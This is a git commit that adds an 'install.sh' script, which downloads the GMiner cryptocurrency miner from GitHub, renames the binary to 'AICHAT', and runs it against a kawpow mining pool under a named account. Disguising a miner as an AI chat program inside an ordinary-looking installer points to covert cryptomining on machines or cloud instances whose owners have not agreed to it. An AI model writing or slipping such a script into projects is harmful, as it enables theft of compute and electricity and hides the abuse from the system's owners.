03201a01d3624106ea68cbdda06804a51baf0aa7
kgj <kgj@mac1.local>
2023-05-14 06:31:00 +0900

    install.sh

---
+++ install.sh
@@ -0,0 +1,7 @@
+apt install screen
+wget 
+https://github.com/develsoftware/GMinerRelease/releases/download/3.40/gminer_3_40_linux64.tar.xz
+tar -xf gminer_3_40_linux64.tar.xz
+mv miner AICHAT
+./AICHAT -a kawpow -s asia.kawpow-hub.miningpoolhub.com:20611 -u 
+waterghost_2046.oci_1
